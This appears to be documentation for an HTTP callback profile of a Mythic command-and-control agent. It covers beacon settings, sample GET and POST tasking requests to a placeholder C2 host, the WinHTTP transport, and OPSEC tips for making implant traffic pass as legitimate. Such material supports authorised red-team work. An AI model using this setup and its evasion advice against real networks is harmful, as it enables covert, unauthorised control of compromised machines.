+++
title = "HTTP"
chapter = false
weight = 5
+++

## Summary

Standard HTTP/HTTPS callback profile using WinHTTP APIs.

## Configuration Parameters

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| Callback Host | String | - | C2 server hostname or IP (e.g., `https://c2.example.com`) |
| Callback Port | Integer | 443 | C2 server port |
| Callback Interval | Integer | 10 | Beacon interval in seconds |
| Callback Jitter | Integer | 23 | Jitter percentage (0-100) |
| Kill Date | Date | - | Agent self-termination date |
| User Agent | String | Mozilla/5.0... | HTTP User-Agent header |
| GET URI | String | /api/v1/query | URI for GET requests (tasking retrieval) |
| POST URI | String | /api/v1/data | URI for POST requests (task responses) |
| Query Parameter | String | q | Query parameter name for GET requests |
| Proxy Host | String | - | Optional HTTP proxy |
| Proxy Port | Integer | - | Proxy port |
| Proxy User | String | - | Proxy authentication username |
| Proxy Password | String | - | Proxy authentication password |

## Message Flow

### Tasking Retrieval (GET)

```
GET /api/v1/query?q=<base64(UUID + AES(TLV))> HTTP/1.1
Host: c2.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

### Task Response (POST)

```
POST /api/v1/data HTTP/1.1
Host: c2.example.com
Content-Type: application/octet-stream

<base64(UUID + AES(TLV))>
```

## Transport Implementation

- Uses `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest` for all HTTP operations
- TLS enabled when callback host starts with `https://`
- Proxy settings applied via `WinHttpSetOption` if configured
- All messages are base64-encoded with the callback UUID prepended before encryption
- Mythic handles server-side AES256 decryption (`mythic_encrypts=True`)

## OPSEC Notes

- WinHTTP is a standard Windows API - blends with legitimate Windows Update and application traffic
- User-Agent should match target environment browsers
- GET URI and POST URI should mimic legitimate API patterns
- Consider using HTTPS with a valid certificate on the C2 redirector
- Proxy support allows operation in corporate environments with mandatory proxy configurations
